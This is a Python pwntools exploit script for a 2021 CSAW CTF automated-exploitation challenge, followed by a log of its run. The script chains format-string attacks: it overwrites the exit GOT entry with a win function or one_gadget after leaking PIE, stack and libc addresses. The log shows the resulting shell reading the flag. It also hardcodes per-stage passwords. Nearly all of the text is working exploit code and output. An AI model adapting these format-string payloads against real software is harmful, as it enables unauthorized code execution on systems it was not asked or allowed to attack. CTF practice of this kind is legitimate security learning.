from pwn import *
import os

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './chall49'
elf  = ELF(BINARY)

#passwd = "cd80d3cd8a479a18bbc9652f3631c61c" # 0
#passwd = "80f5478a7fd72199229d588cd01d8c1a" # 14
#passwd = "34349f3e6d02cc9f1b1917f7b39b8c39" # 13
passwd = "a60d54c8e22e29052bf16dd854d189ab" # 15
passwd = "3ca7cdd88e1b97345725287040a47c35" # 29
passwd = "676b8b041ae5640ba189fe0fa12a0fe3" # 30
passwd = "e02d9819275a736cdfb5bff2e30f3f50" # 45
#passwd = "25f241b9b6c236cc30c2c2a59ff0c094" # 44
passwd = "2d18ecd9b030d6e75f40a1005c699679" # 48
passwd = "c2e3b5a18558c52e952c8da894a97d40" # 48

for i in range(49, 60):
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "auto-pwn.chal.csaw.io"
    PORT = 11001 + i
    s = remote(HOST, PORT)
    libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so")
    one_gadget = 0xe6c81
  else:
    s = process(BINARY)
    libc = elf.libc
    one_gadget = 0xe6af1

  s.sendlineafter("> ", passwd)
  s.recvuntil("-------------------------------------------------------------------")
  bin_hex = s.recvuntil("--\n\n")[:-2]
  os.system("rm bin_hex.txt")
  f0 = open("bin_hex.txt", "w")
  f0.write(bin_hex)
  f0.close()
  os.system("xxd -r bin_hex.txt > chall" + str(i))
  if i < 15:
    os.system("cat bin_add >> chall" + str(i))
  os.system("chmod 755 ./chall"+ str(i))

  BINARY = './chall' + str(i)
  elf1  = ELF(BINARY)
  #elf1 = elf

  s.recvuntil("> ")

  index = 6
  if i >= 15 and i <=44:
    if i >= 30:
      buf1 = open("./chall" + str(i), "r").read()
      pos1 = buf1.find("\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\x48")  
      win_addr = 0x400000 + pos1
    else:
      win_addr = elf1.sym.win

    context(os='linux', arch='amd64')
    a0 = win_addr&0xffff
    a1 = (win_addr>>16)&0xffff
    a2 = (win_addr>>32)&0xffff
    a2 = ((a2-a1-1) % 0x10000) + 1
    a1 = ((a1-a0-1) % 0x10000) + 1
    a0 = ((a0-1) % 0x10000) + 1
    buf = "%%%dc%%%d$hn" % (a0, index+5)
    buf += "%%%dc%%%d$hn" % (a1, index+6)
    buf += "%%%dc%%%d$hn" % (a2, index+7)
    buf += "-"*(8-len(buf)%8)
    buf += p64(elf.got.exit)
    buf += p64(elf.got.exit+2)
    buf += p64(elf.got.exit+4)
    s.sendline(buf)
  elif i >= 45:
    index = 8
    # pie and stack leak 
    buf = "%49$p,%47$p,"
    s.sendline(buf)
    s.recvuntil("Report 1:\n")
    pie_base   = int(s.recvuntil(",")[:-1], 16) - 0x14b7
    stack_leak = int(s.recvuntil(",")[:-1], 16)
    print "pie_base   =", hex(pie_base)
    print "stack_leak =", hex(stack_leak)

    # libc leak
    buf = "%9$s----" + p64(pie_base + elf.got.puts)
    s.sendline(buf) 
    s.recvuntil("Report 2:\n")

    puts_addr   = u64(s.recvuntil("-")[:-1]+"\x00\x00")
    libc_base   = puts_addr - libc.sym.puts
    system_addr = libc_base + libc.sym.system
    binsh_addr  = libc_base + next(libc.search('/bin/sh'))
    print "puts_addr  =", hex(puts_addr)
    print "libc_base  =", hex(libc_base)

    pop_rdi_ret = 0x1633 # pop rdi; ret; 

    a0 = (libc_base + one_gadget)&0xffff
    a1 = ((libc_base + one_gadget)>>16)&0xffff
    a2 = ((libc_base + one_gadget)>>32)&0xffff

    a2 = ((a2-a1-1) % 0x10000) + 1
    a1 = ((a1-a0-1) % 0x10000) + 1
    a0 = ((a0-1) % 0x10000) + 1

    buf  = "%%%dc%%%d$hn" % (a0, index+5)
    buf += "%%%dc%%%d$hn" % (a1, index+6)
    buf += "%%%dc%%%d$hn" % (a2, index+7)
    buf += "-"*(8-len(buf)%8)
    buf += p64(stack_leak - 0x230)
    buf += p64(stack_leak - 0x230 + 2)
    buf += p64(stack_leak - 0x230 + 4)
    #pause()
    s.sendline(buf)

  else:
    writes = {elf1.got.exit: elf1.sym.win}
    buf  = "AA"+fmtstr_payload(index, writes, numbwritten=2, write_size='byte')
    s.sendline(buf)

  if i == 49:
    s.interactive()
  s.sendline("cat message.txt")
  s.recvuntil("and use password ")
  passwd = s.recvuntil("\n")[:-1]
  print i, "password =", passwd
  #s.interactive()
  s.close()

s.interactive()

'''
mito@ubuntu:~/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator$ python solve.py r
[*] '/home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator/chall49'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to auto-pwn.chal.csaw.io on port 11050: Done
[*] '/home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator/libc6_2.31-0ubuntu9.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_base   = 0x55f9f517d000
stack_leak = 0x7ffe40a70c28
puts_addr  = 0x7f088838c5a0
libc_base  = 0x7f0888305000
[*] Switching to interactive mode

$ id
uid=1000(chal) gid=1000(chal) groups=1000(chal)
$ ls -l
total 68
-r-xr-xr-x 1 root chal 12192 Sep  8 02:25 binary_50
-r--r--r-- 1 root chal 51816 Sep  8 02:25 binary_50.txt
-r--r--r-- 1 root chal    93 Sep  8 02:25 flag.txt
$ cat flag.txt
flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}
'''
